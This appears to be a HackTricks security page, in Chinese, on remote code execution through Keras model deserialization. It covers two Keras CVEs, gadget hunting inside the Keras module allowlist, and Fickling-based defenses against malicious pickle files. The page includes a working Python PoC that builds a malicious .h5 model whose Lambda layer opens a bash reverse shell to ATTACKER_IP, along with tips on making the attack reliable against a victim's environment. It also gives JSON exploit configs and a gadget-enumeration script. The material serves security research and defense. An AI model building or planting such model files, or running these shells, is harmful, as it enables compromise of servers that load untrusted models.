# Keras 模型反序列化 RCE 与 Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

本页面总结针对 Keras 模型反序列化 pipeline 的 practical exploitation techniques，介绍原生 .keras format 的内部结构与 attack surface，并提供用于发现 Model File Vulnerabilities (MFVs) 和 post-fix gadgets 的 researcher toolkit。

## .keras model format internals

一个 .keras 文件是一个 ZIP archive，至少包含：<sup>[[1]](#references)</sup>
- metadata.json – 通用信息（例如 Keras 版本）
- config.json – 模型架构（主要 attack surface）
- model.weights.h5 – HDF5 中的 weights

config.json 驱动递归反序列化：Keras 导入 modules，解析 classes/functions，并根据 attacker-controlled dictionaries 重建 layers/objects。<sup>[[1]](#references)</sup>

Dense layer object 示例片段：
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization 执行以下操作：<sup>[[1]](#references)</sup>
- 根据 `module/class_name` keys 执行 Module import 和 symbol resolution
- 使用攻击者可控的 kwargs 调用 `from_config(...)` 或 constructor
- 递归处理嵌套对象（activations、initializers、constraints 等）

历史上，这使攻击者在构造 `config.json` 时获得了以下三个原语：<sup>[[1]](#references)</sup>
- 控制要 import 的 modules
- 控制要解析的 classes/functions
- 控制传递给 constructors/from_config 的 kwargs

## CVE-2024-3660 – Lambda-layer bytecode RCE

根本原因：
- `Lambda.from_config()` 使用 `python_utils.func_load(...)`，该函数会对攻击者提供的 bytes 执行 base64-decode 并调用 `marshal.loads()`；Python unmarshalling 可能执行代码。<sup>[[1]](#references)[[3]](#references)</sup>

Exploit idea（`config.json` 中的简化 payload）：
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
缓解措施：
- Keras 默认强制使用 safe_mode=True。除非用户明确使用 safe_mode=False 选择退出，否则会阻止 Lambda 中序列化的 Python 函数。<sup>[[1]](#references)</sup>

注意：
- Legacy formats（较旧的 HDF5 保存格式）或较旧的 codebase 可能不会执行现代检查，因此当受害者使用较旧的 loader 时，“downgrade”风格的 attacks 仍然可能适用。

## CVE-2025-1550 – Keras ≤ 3.8 中的任意 module import

根本原因：
- _retrieve_class_or_fn 使用不受限制的 importlib.import_module()，并从 config.json 中读取由 attacker 控制的 module 字符串。
- 影响：可任意 import 任何已安装的 module（或 sys.path 上由 attacker 植入的 module）。Import-time code 会执行，随后使用 attacker 的 kwargs 进行 object construction。<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

利用思路：
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Security improvements (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist：imports 仅限于官方 ecosystem modules：keras、keras_hub、keras_cv、keras_nlp
- Safe mode default：safe_mode=True 会阻止不安全的 Lambda serialized-function loading
- Basic type checking：deserialized objects 必须匹配预期类型

## Practical exploitation：TensorFlow-Keras HDF5 (.h5) Lambda RCE

许多 production stacks 仍接受 legacy TensorFlow-Keras HDF5 model files (.h5)。如果攻击者可以上传一个之后会被 server 加载或用于 inference 的 model，那么 Lambda layer 可在 load/build/predict 时执行任意 Python。<sup>[[7]](#references)</sup>

用于构造恶意 .h5 的最小 PoC，在其被 deserialized 或使用时执行 reverse shell：
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
注意事项和可靠性建议：
- 触发点：code 可能会运行多次（例如在 layer 构建/首次调用、model.load_model 以及 predict/fit 期间）。请使 payloads 具备幂等性。<sup>[[7]](#references)</sup>
- 版本固定：使受害者的 TF/Keras/Python 版本保持匹配，以避免序列化不匹配。例如，如果目标使用 Python 3.8 和 TensorFlow 2.13.1，则应在该环境下构建 artifacts。<sup>[[7]](#references)</sup>
- 快速环境复现：
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validation：像 `os.system("ping -c 1 YOUR_IP")` 这样的 benign payload 有助于在切换到 reverse shell 之前确认执行情况（例如，使用 tcpdump 观察 ICMP）。<sup>[[7]](#references)</sup>

## allowlist 内的 Post-fix gadget surface

即使使用 allowlisting 和 safe mode，允许的 Keras callables 中仍然存在广泛的 gadget surface。例如，keras.utils.get_file 可以将任意 URL 下载到用户可选择的位置。<sup>[[1]](#references)</sup>

通过引用允许函数的 Lambda 实现的 Gadget（未序列化 Python bytecode）：
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
重要限制：
- Lambda.call() 在调用目标 callable 时会将输入 tensor 作为第一个 positional argument 添加到参数列表开头。选定的 gadgets 必须能够容忍额外的 positional arg（或接受 *args/**kwargs）。这限制了哪些函数可用。<sup>[[1]](#references)</sup>

## AI/ML 模型的 ML pickle import allowlisting（Fickling）

许多 AI/ML 模型格式（PyTorch .pt/.pth/.ckpt、joblib/scikit-learn、旧版 TensorFlow artifacts 等）都嵌入了 Python pickle 数据。攻击者经常滥用 pickle GLOBAL imports 和 object constructors，在加载期间实现 RCE 或 model swapping。基于 blacklist 的 scanners 经常会漏掉新出现的或未列出的危险 imports。<sup>[[8]](#references)[[14]](#references)</sup>

一种实用的 fail-closed 防御方式是 hook Python 的 pickle deserializer，并且只允许在 unpickling 期间使用一组经过审查的 harmless ML-related imports。Trail of Bits 的 Fickling 实现了这一策略，并提供了一个 curated ML import allowlist，该 allowlist 基于数千个公开的 Hugging Face pickles 构建。<sup>[[8]](#references)[[13]](#references)</sup>

“safe” imports 的 security model（从研究和实践中提炼出的直观原则）：pickle 使用的 imported symbols 必须同时满足以下条件：<sup>[[8]](#references)</sup>
- 不执行代码或导致代码执行（不得包含 compiled/source code objects、shelling out、hooks 等）
- 不得 get/set arbitrary attributes 或 items
- 不得从 pickle VM 中 import 或获取对其他 Python objects 的 references
- 不得触发任何 secondary deserializers（例如 marshal、nested pickle），即使是间接触发

应尽早在 process startup 时启用 Fickling 的 protections，以确保 framework 执行的任何 pickle loads（torch.load、joblib.load 等）都会受到检查：<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
操作提示：
- 你可以在需要时临时禁用/重新启用 hooks：<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- 如果一个已知安全的 model 被阻止，在审查 symbols 后，为你的环境扩展 allowlist：<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- 如果你偏好更细粒度的控制，Fickling 还提供了通用的 runtime guards：<sup>[[9]](#references)</sup>
- `fickling.always_check_safety()`：强制对所有 `pickle.load()` 执行检查
- `with fickling.check_safety():`：用于限定范围内的强制检查
- `fickling.load(path)` / `fickling.is_likely_safe(path)`：用于单次检查

- 在可能的情况下，优先使用非 pickle 模型格式（例如 SafeTensors）。<sup>[[15]](#references)</sup> 如果必须接受 pickle，应在最小权限下运行 loaders，禁止网络外连，并强制执行 allowlist。

这种 allowlist-first 策略能够有效阻断常见的 ML pickle exploit 路径，同时保持较高的兼容性。在 ToB 的 benchmark 中，Fickling 检测出了 100% 的合成 malicious 文件，并允许来自顶级 Hugging Face repos 的约 99% 的 clean 文件通过。<sup>[[8]](#references)[[10]](#references)</sup>


## 研究人员工具包

1) 在允许的模块中系统化发现 gadget

枚举 keras、keras_nlp、keras_cv、keras_hub 中的候选 callables，并优先关注具有文件、网络、进程或环境副作用的对象。<sup>[[1]](#references)</sup>

<details>
<summary>枚举 allowlisted Keras 模块中潜在危险的 callables</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) 直接进行 deserialization 测试（无需 .keras archive）

将构造的字典直接传入 Keras deserializers，以了解可接受的参数并观察副作用。<sup>[[1]](#references)</sup>
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) 跨版本探测与格式

Keras 存在于多个具有不同防护机制和格式的代码库/时代中：<sup>[[1]](#references)</sup>
- TensorFlow 内置 Keras：tensorflow/python/keras（legacy，即将删除）
- tf-keras：独立维护
- Multi-backend Keras 3（official）：引入原生 .keras

在不同代码库和格式（.keras 与 legacy HDF5）之间重复测试，以发现回归问题或缺失的防护机制。

## References

- [1] [Keras Model Deserialization 中的漏洞挖掘（huntr 博客）](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – 为 serialization 添加检查](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Keras arbitrary module import（≤ 3.8）](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr 报告 – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr 报告 – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits 博客 – Fickling 的全新 AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Securing AI/ML environments（README）](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
